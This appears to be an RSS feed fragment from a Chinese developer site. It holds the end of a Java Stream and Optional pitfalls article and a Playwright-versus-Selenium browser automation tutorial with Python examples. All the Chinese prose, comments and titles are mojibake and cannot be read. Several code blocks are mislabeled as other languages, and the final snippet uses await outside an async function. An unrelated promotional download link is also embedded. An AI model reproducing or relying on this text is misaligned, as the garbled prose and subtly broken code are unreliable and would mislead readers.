    }
    
    <span class="hljs-comment">// é™·é˜±2ï¼šè¿‡åº¦ä½¿ç”¨Stream</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pitfall2</span><span class="hljs-params">()</span> {
        List&lt;String&gt; list = Arrays.asList(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);
        
        <span class="hljs-comment">// âŒ è¿‡åº¦ä½¿ç”¨Streamï¼ˆç®€å•æ“ä½œï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">result1</span> <span class="hljs-operator">=</span> list.stream()
            .filter(s -&gt; s.equals(<span class="hljs-string">"B"</span>))
            .findFirst()
            .orElse(<span class="hljs-string">"Not found"</span>);
        
        <span class="hljs-comment">// âœ… ä¼ ç»Ÿæ–¹å¼æ›´ç®€æ´</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">result2</span> <span class="hljs-operator">=</span> list.contains(<span class="hljs-string">"B"</span>) ? <span class="hljs-string">"B"</span> : <span class="hljs-string">"Not found"</span>;
        
        <span class="hljs-comment">// åŸåˆ™ï¼šStreamé€‚ç”¨äºå¤æ‚çš„æ•°æ®å¤„ç†æµæ°´çº¿</span>
    }
    
    <span class="hljs-comment">// é™·é˜±3ï¼šå¿½ç•¥ç©ºOptional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pitfall3</span><span class="hljs-params">()</span> {
        Optional&lt;String&gt; optional = Optional.ofNullable(<span class="hljs-literal">null</span>);
        
        <span class="hljs-comment">// âŒ é”™è¯¯ï¼šç›´æ¥è°ƒç”¨get()</span>
        <span class="hljs-comment">// String value = optional.get();  // å¯èƒ½æŠ›å‡ºNoSuchElementException</span>
        
        <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šæä¾›é»˜è®¤å€¼æˆ–å¤„ç†ç©ºæƒ…å†µ</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> optional.orElse(<span class="hljs-string">"default"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> optional.orElseGet(() -&gt; generateDefault());
        optional.ifPresent(v -&gt; System.out.println(v));
    }
    
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">generateDefault</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"generated default"</span>;
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨Playwrightæ›¿ä»£Seleniumï¼šæ›´å¿«æ›´ç°ä»£çš„æµè§ˆå™¨è‡ªåŠ¨åŒ–å®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7582246395986968610</link>    <guid>https://juejin.cn/post/7582246395986968610</guid>    <pubDate>2025-12-11T08:11:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582246395986968610" data-draft-id="7582358932027555855" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨Playwrightæ›¿ä»£Seleniumï¼šæ›´å¿«æ›´ç°ä»£çš„æµè§ˆå™¨è‡ªåŠ¨åŒ–å®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-11T08:11:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç«™å¤§çˆ·IP"/> <meta itemprop="url" content="https://juejin.cn/user/2905353241759261"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨Playwrightæ›¿ä»£Seleniumï¼šæ›´å¿«æ›´ç°ä»£çš„æµè§ˆå™¨è‡ªåŠ¨åŒ–å®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2905353241759261/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç«™å¤§çˆ·IP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T08:11:37.000Z" title="Thu Dec 11 2025 08:11:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<h2 data-id="heading-0">å¼•è¨€ï¼šä¸ºä»€ä¹ˆéœ€è¦æ›¿ä»£Seleniumï¼Ÿ</h2>
<p>åå¹´å‰ï¼ŒSeleniumæ˜¯æµè§ˆå™¨è‡ªåŠ¨åŒ–çš„ç»å¯¹ç‹è€…ã€‚å®ƒæ”¯æŒå¤šç§è¯­è¨€ã€è·¨æµè§ˆå™¨è¿è¡Œï¼Œæˆä¸ºæµ‹è¯•å·¥ç¨‹å¸ˆå’Œçˆ¬è™«å¼€å‘è€…çš„é¦–é€‰å·¥å…·ã€‚ä½†éšç€WebæŠ€æœ¯é£é€Ÿå‘å±•ï¼ŒSeleniumçš„å±€é™æ€§é€æ¸æ˜¾ç°ï¼šAPIè®¾è®¡å†—ä½™ã€æ‰§è¡Œé€Ÿåº¦æ…¢ã€å¯¹ç°ä»£Webç‰¹æ€§æ”¯æŒæ»åã€‚å°±åƒç”¨è€å¼æ‰‹æœºåˆ·çŸ­è§†é¢‘â€”â€”èƒ½ç”¨ï¼Œä½†ä½“éªŒè¿œä¸å¦‚æ™ºèƒ½æ‰‹æœºã€‚</p>
<p><strong>ã€Œç¼–ç¨‹ç±»è½¯ä»¶å·¥å…·åˆé›†ã€
é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.quark.cn%2Fs%2F0b6102d9a66a" target="_blank" title="https://pan.quark.cn/s/0b6102d9a66a" ref="nofollow noopener noreferrer">pan.quark.cn/s/0b6102d9aâ€¦</a></strong></p>
<p>Playwrightçš„å‡ºç°å½»åº•æ”¹å˜äº†æ¸¸æˆè§„åˆ™ã€‚è¿™ä¸ªç”±å¾®è½¯å¼€å‘çš„å·¥å…·ï¼Œä¸“ä¸ºç°ä»£Webæ‰“é€ ï¼Œç”¨æ›´ç®€æ´çš„APIå®ç°æ›´å¿«çš„æ‰§è¡Œé€Ÿåº¦ï¼Œè¿˜èƒ½è½»æ¾åº”å¯¹åŠ¨æ€æ¸²æŸ“ã€å¤šé¡µé¢äº¤äº’ç­‰å¤æ‚åœºæ™¯ã€‚æœ¬æ–‡å°†é€šè¿‡çœŸå®æ¡ˆä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ç”¨Playwrighté‡æ„ä¼ ç»ŸSeleniumé¡¹ç›®ï¼Œå¹¶å¯¹æ¯”ä¸¤è€…çš„æ€§èƒ½å·®å¼‚ã€‚</p>
<hr/>
<h2 data-id="heading-1">ä¸€ã€ä»Seleniumåˆ°Playwrightï¼šæ ¸å¿ƒå·®å¼‚å¯¹æ¯”</h2>
<h3 data-id="heading-2">1. æ¶æ„è®¾è®¡ï¼šæ›´è½»é‡çš„é€šä¿¡æœºåˆ¶</h3>
<p>Seleniumé€šè¿‡JSON Wire Protocolæˆ–W3C WebDriveråè®®ä¸æµè§ˆå™¨é€šä¿¡ï¼Œè¿™ç§è®¾è®¡åœ¨2010å¹´åˆç†ï¼Œä½†å¦‚ä»Šæ˜¾å¾—ç¬¨é‡ã€‚æ¯æ¬¡æ“ä½œéƒ½è¦ç»è¿‡"å®¢æˆ·ç«¯â†’é©±åŠ¨â†’æµè§ˆå™¨"çš„ä¸‰å±‚è½¬å‘ï¼Œå°±åƒç”¨å¯¹è®²æœºæŒ‡æŒ¥æ— äººæœºâ€”â€”å»¶è¿Ÿæ˜æ˜¾ã€‚</p>
<p>Playwrightç›´æ¥åµŒå…¥æµè§ˆå™¨è¿›ç¨‹ï¼ˆChromium/Firefox/WebKitï¼‰ï¼Œé€šè¿‡DevTools Protocolé€šä¿¡ã€‚è¿™ç§è®¾è®¡æ¶ˆé™¤äº†ä¸­é—´å±‚ï¼Œæ“ä½œå“åº”é€Ÿåº¦æå‡3-5å€ã€‚å®æµ‹ä¸­ï¼Œæ‰“å¼€ç™¾åº¦é¦–é¡µå¹¶æœç´¢å…³é”®è¯ï¼š</p>
<ul>
<li>Seleniumï¼ˆChromeDriverï¼‰ï¼šå¹³å‡è€—æ—¶2.1ç§’</li>
<li>Playwrightï¼šå¹³å‡è€—æ—¶0.7ç§’</li>
</ul>
<h3 data-id="heading-3">2. APIè®¾è®¡ï¼šæ›´ç¬¦åˆç›´è§‰çš„ç¼–ç¨‹æ¨¡å‹</h3>
<p>Seleniumçš„APIè®¾è®¡å¸¦æœ‰æ˜æ˜¾çš„å†å²åŒ…è¢±ã€‚ä¾‹å¦‚å®šä½å…ƒç´ éœ€è¦å…ˆåˆ›å»º<code>WebDriverWait</code>å¯¹è±¡ï¼Œå†è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œæœ€åè°ƒç”¨<code>until</code>æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">from</span> selenium.<span class="hljs-property">webdriver</span>.<span class="hljs-property">support</span>.<span class="hljs-property">ui</span> <span class="hljs-keyword">import</span> <span class="hljs-title class_">WebDriverWait</span>
<span class="hljs-keyword">from</span> selenium.<span class="hljs-property">webdriver</span>.<span class="hljs-property">support</span> <span class="hljs-keyword">import</span> expected_conditions <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">EC</span>

wait = <span class="hljs-title class_">WebDriverWait</span>(driver, <span class="hljs-number">10</span>)
element = wait.<span class="hljs-title function_">until</span>(<span class="hljs-variable constant_">EC</span>.<span class="hljs-title function_">presence_of_element_located</span>((<span class="hljs-title class_">By</span>.<span class="hljs-property">ID</span>, <span class="hljs-string">"kw"</span>)))
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>Playwrighté‡‡ç”¨é“¾å¼è°ƒç”¨ï¼Œæ‰€æœ‰æ“ä½œéƒ½å¯ç›´æ¥ä¸²è”ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">element</span> = page.get_by_id(<span class="hljs-string">"kw"</span>).wait_for(state=<span class="hljs-string">"visible"</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>è¿™ç§è®¾è®¡ä¸ä»…ä»£ç é‡å‡å°‘60%ï¼Œæ›´é‡è¦çš„æ˜¯å‡å°‘äº†çŠ¶æ€ç®¡ç†çš„å¤æ‚æ€§ã€‚å¼€å‘è€…æ— éœ€æ‰‹åŠ¨ç»´æŠ¤ç­‰å¾…é€»è¾‘ï¼ŒPlaywrightä¼šè‡ªåŠ¨å¤„ç†é¡µé¢åŠ è½½ã€ç½‘ç»œè¯·æ±‚ç­‰å¼‚æ­¥äº‹ä»¶ã€‚</p>
<h3 data-id="heading-4">3. å¤šæµè§ˆå™¨æ”¯æŒï¼šçœŸæ­£çš„è·¨å¼•æ“æ–¹æ¡ˆ</h3>
<p>Seleniumé€šè¿‡ä¸åŒé©±åŠ¨æ”¯æŒå¤šæµè§ˆå™¨ï¼Œä½†æœ¬è´¨æ˜¯"åŒä¸€å¥—APIé€‚é…ä¸åŒå®ç°"ã€‚è¿™å¯¼è‡´æŸäº›ç‰¹æ€§åœ¨ä¸åŒæµè§ˆå™¨è¡¨ç°ä¸ä¸€è‡´ï¼Œæ¯”å¦‚æ–‡ä»¶ä¸Šä¼ åœ¨Firefoxéœ€è¦ç‰¹æ®Šå¤„ç†ã€‚</p>
<p>Playwrightä¸ºæ¯ä¸ªæµè§ˆå™¨å¼•æ“ï¼ˆChromium/Firefox/WebKitï¼‰ç¼–å†™åŸç”Ÿå®ç°ï¼Œç¡®ä¿è¡Œä¸ºä¸€è‡´ã€‚æ›´å‰å®³çš„æ˜¯æ”¯æŒå¤šæ ‡ç­¾é¡µã€å¤šçª—å£çš„å¹¶è¡Œæ“ä½œï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># åŒæ—¶æ“ä½œä¸‰ä¸ªæµè§ˆå™¨çª—å£</span>
<span class="hljs-attr">browser</span> = playwright.chromium.launch()
<span class="hljs-attr">page1</span> = browser.new_page()
<span class="hljs-attr">page2</span> = browser.new_page()
<span class="hljs-attr">page3</span> = browser.new_page()
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-5">äºŒã€å®æˆ˜è¿ç§»ï¼šä»Seleniumåˆ°Playwrightçš„å®Œæ•´æµç¨‹</h2>
<p>ä»¥ä¸€ä¸ªç”µå•†ç½‘ç«™çš„å•†å“æœç´¢+ä»·æ ¼ç›‘æ§è„šæœ¬ä¸ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•è¿ç§»ã€‚</p>
<h3 data-id="heading-6">1. ç¯å¢ƒå‡†å¤‡ï¼šå®‰è£…ä¸é…ç½®</h3>
<p>å®‰è£…Playwrightåªéœ€ä¸€æ¡å‘½ä»¤ï¼ˆè‡ªåŠ¨ä¸‹è½½æµè§ˆå™¨äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ï¼š</p>
<pre><code class="hljs">pip install playwright
playwright install
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>å¯¹æ¯”Seleniuméœ€è¦å•ç‹¬ä¸‹è½½ChromeDriverï¼Œä¸”ç‰ˆæœ¬éœ€ä¸æµè§ˆå™¨ä¸¥æ ¼åŒ¹é…ï¼ŒPlaywrightçš„"å¼€ç®±å³ç”¨"ä½“éªŒä¼˜åŠ¿æ˜æ˜¾ã€‚</p>
<h3 data-id="heading-7">2. åŸºç¡€æ“ä½œå¯¹æ¯”</h3>
<p><strong>åœºæ™¯ï¼šæ‰“å¼€æ·˜å®é¦–é¡µå¹¶æœç´¢"iPhone 15"</strong></p>
<p>Seleniumå®ç°ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">from</span> selenium import webdriver
<span class="hljs-keyword">from</span> selenium.webdriver.common.<span class="hljs-keyword">by</span> import <span class="hljs-keyword">By</span>
<span class="hljs-keyword">from</span> selenium.webdriver.common.keys import Keys

driver = webdriver.Chrome()
driver.<span class="hljs-keyword">get</span>(<span class="hljs-string">"https://www.taobao.com"</span>)
search_box = driver.find_element(<span class="hljs-keyword">By</span>.ID, <span class="hljs-string">"q"</span>)
search_box.send_keys(<span class="hljs-string">"iPhone 15"</span>)
search_box.send_keys(Keys.<span class="hljs-keyword">RETURN</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>Playwrightå®ç°ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">from</span> playwright<span class="hljs-selector-class">.sync_api</span> import sync_playwright

with sync_playwright() as <span class="hljs-selector-tag">p</span>:
    browser = p.chromium.<span class="hljs-built_in">launch</span>()
    page = browser.<span class="hljs-built_in">new_page</span>()
    page.<span class="hljs-built_in">goto</span>(<span class="hljs-string">"https://www.taobao.com"</span>)
    page.<span class="hljs-built_in">fill</span>(<span class="hljs-string">"#q"</span>, <span class="hljs-string">"iPhone 15"</span>)
    page.<span class="hljs-built_in">press</span>(<span class="hljs-string">"#q"</span>, <span class="hljs-string">"Enter"</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>å…³é”®å·®å¼‚ï¼š</p>
<ul>
<li>Playwrightæ— éœ€æ˜¾å¼ç­‰å¾…é¡µé¢åŠ è½½</li>
<li>å…ƒç´ å®šä½æ›´ç®€æ´ï¼ˆç›´æ¥ä½¿ç”¨CSSé€‰æ‹©å™¨ï¼‰</li>
<li>è‡ªåŠ¨å¤„ç†é”®ç›˜äº‹ä»¶</li>
</ul>
<h3 data-id="heading-8">3. é«˜çº§åŠŸèƒ½å®ç°</h3>
<p><strong>åœºæ™¯ï¼šå¤„ç†ç™»å½•å¼¹çª—</strong></p>
<p>Seleniuméœ€è¦åˆ‡æ¢iframeæˆ–çª—å£å¥æŸ„ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">driver<span class="hljs-selector-class">.switch_to</span><span class="hljs-selector-class">.frame</span>("login_frame")
driver<span class="hljs-selector-class">.find_element</span>(By.ID, "username")<span class="hljs-selector-class">.send_keys</span>("test")
driver<span class="hljs-selector-class">.switch_to</span><span class="hljs-selector-class">.default_content</span>()
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>PlaywrightåŸç”Ÿæ”¯æŒæ¡†æ¶åˆ‡æ¢ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">with</span> page.frame_locator(<span class="hljs-string">"login_frame"</span>) <span class="hljs-keyword">as</span> frame:
    frame.fill(<span class="hljs-string">"#username"</span>, <span class="hljs-string">"test"</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>åœºæ™¯ï¼šç½‘ç»œè¯·æ±‚æ‹¦æˆª</strong></p>
<p>ç›‘æ§å•†å“ä»·æ ¼APIè¯·æ±‚ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"># Playwrightå®ç°
def <span class="hljs-built_in">handle_route</span>(route):
    if route.request.resource_type == <span class="hljs-string">"xhr"</span> and <span class="hljs-string">"price"</span> in route.request.url:
        <span class="hljs-built_in">print</span>(route.request.url)
    route.<span class="hljs-built_in">continue_</span>()

page.<span class="hljs-built_in">route</span>(<span class="hljs-string">"**/*"</span>, handle_route)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>Seleniuméœ€è¦é¢å¤–å®‰è£…BrowserMob Proxyç­‰å·¥å…·ï¼Œé…ç½®å¤æ‚åº¦æ˜¾è‘—å¢åŠ ã€‚</p>
<hr/>
<h2 data-id="heading-9">ä¸‰ã€æ€§èƒ½ä¼˜åŒ–å®æˆ˜æŠ€å·§</h2>
<h3 data-id="heading-10">1. å¹¶è¡Œæ‰§è¡Œï¼šå……åˆ†åˆ©ç”¨å¤šæ ¸CPU</h3>
<p>Playwrightå†…ç½®å¹¶è¡Œæ”¯æŒï¼Œè½»æ¾å®ç°å¤šä»»åŠ¡åŒæ—¶è¿è¡Œï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">from</span> playwright.async_api <span class="hljs-keyword">import</span> async_playwright

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">run_task</span>(<span class="hljs-params">url</span>):
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> async_playwright() <span class="hljs-keyword">as</span> p:
        browser = <span class="hljs-keyword">await</span> p.chromium.launch()
        page = <span class="hljs-keyword">await</span> browser.new_page()
        <span class="hljs-keyword">await</span> page.goto(url)
        <span class="hljs-comment"># æ‰§è¡Œå…¶ä»–æ“ä½œ...</span>

urls = [<span class="hljs-string">"https://example.com"</span>, <span class="hljs-string">"https://example.org"</span>]
<span class="hljs-keyword">await</span> asyncio.gather(*[run_task(url) <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls])
</code></pre>
